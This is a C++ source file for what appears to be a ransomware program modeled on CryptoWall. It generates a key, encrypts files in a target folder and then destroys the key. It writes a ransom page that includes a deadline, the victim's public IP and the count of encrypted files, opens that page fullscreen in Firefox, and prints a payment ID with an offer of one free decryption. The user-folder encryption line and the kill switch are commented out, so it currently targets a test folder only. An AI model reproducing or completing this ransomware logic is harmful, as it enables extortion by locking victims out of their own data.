#include <time.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>

#ifdef _WIN32
#include <Lmcons.h>
#include <windows.h>
#endif

#include "drm.h"
#include "base64.h" // User ID
#include "factory.h"

int main() {
  /// HIDE CONSOLE
#ifdef _WIN32
  //FreeConsole();
#endif
  // Warning!!! This is all the security you will get.
  // Remove the line below under your own risk
  //if (KillSwitch()) exit(EXIT_FAILURE);

  Factory* factory = new Factory();
  IController* encrypter = factory->getIController();
  
  /// GENERATE KEY
  char* id; unsigned int len;
  encrypter->generateKey(id, len);

  /// ENCRYPT FILES
#ifdef _WIN32
  DWORD length = UNLEN + 1;
  char username[length];
  GetUserName(username, &length);
  char* path = new char[length + 12];
  sprintf(path, "C:\\Users\\%s", username);

  /// Encrypt Files in those folders and subfolders:
  // Encrypt user folder
  //SearchFiles(path, key);
  //encrypter->encrypt(path);
  // Encrypt example folder (use always two backslashes)
  encrypter->encrypt("testfolder");
  //encrypter->encrypt(D:\\);
#else
  // On linux use a single slash
  //SearchFiles("../testfolder", key);
#endif

  encrypter->destroyKey();

  /// GET TIME OF TOMORROW
  time_t timenow = time(NULL) + 24 * 60 * 60;
  tm* timeinfo = localtime(&timenow);
  unsigned int year = timeinfo->tm_year + 1900;
  unsigned int month = timeinfo->tm_mon + 1;

  /// ADD DATE TO FILE
#ifdef _WIN32
  FILE* cryptowall = fopen("cryptowall\\index.htm", "r+");
#else
  FILE* cryptowall = fopen("cryptowall/index.htm", "r+");
#endif
  fseek(cryptowall, 304, SEEK_SET);
  fprintf(cryptowall, "%02u-%02u-%02u %02u:%02u:%02u", year, month,
          timeinfo->tm_mday, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);

  /// GET IP
  unsigned int ip[4];
#ifdef _WIN32
  system("getip.bat");
#else
  system("dig @resolver1.opendns.com A myip.opendns.com +short -4 > ip");
#endif
  FILE* loadip = fopen("ip", "r+");
  fscanf(loadip, "%u.%u.%u.%u", &ip[0], &ip[1], &ip[2], &ip[3]);
  fclose(loadip);

  /// ADD IP TO FILE
  fseek(cryptowall, 1775, SEEK_SET);
  // ip may have different lengths: 0.0.0.0 / 255.255.255.255, pad with spaces
  char ipbuffer[16] = "               ";
  int ip_pad = sprintf(ipbuffer, "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
  ipbuffer[ip_pad] = ' '; // Remove '\0' set by sprintf
  fwrite(ipbuffer, sizeof(char), 15, cryptowall);
  remove("ip");

  /// ADD Total Files Encrypted
  fseek(cryptowall, 1965, SEEK_SET);
  char cfbuffer[32];
  strcpy(cfbuffer, "      ");
  int cf_pad;
  unsigned int cant_files = encrypter->getCantEncrypted();
  if (cant_files > 1000)
    cf_pad = sprintf(cfbuffer, "%u,%03u", cant_files / 1000, cant_files % 1000);
  else
    cf_pad = sprintf(cfbuffer, "%u", cant_files % 1000);
  cfbuffer[cf_pad] = ' '; // Remove '\0' set by sprintf
  fwrite(cfbuffer, sizeof(char), 6, cryptowall);
  fclose(cryptowall);

  /// SHOW MESSAGE FULLSCREEN
#ifdef _WIN32
  system("start /b cmd /c \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -new-window cryptowall\\index.htm");
  system("fullscreen.vbs");
#else
  system("firefox -new-window cryptowall/index.htm &");
  sleep(2);
  system("xdotool key Alt+Tab");
  sleep(1);
  system("xdotool key F11");
#endif

  // include this to the .txt
  printf("\nAfter payment, use the next id to generate your key: ");
  PrintBase64(id, len);
  printf("You can also use it to decrypt one file for free!\n");

  /// SAVE ID TO FILE
  FILE* idfile = fopen("ID.txt", "wb");
  fwrite(id, sizeof(uint8_t), len, idfile);
  fclose(idfile);
  delete[] id;
  return 0;
}
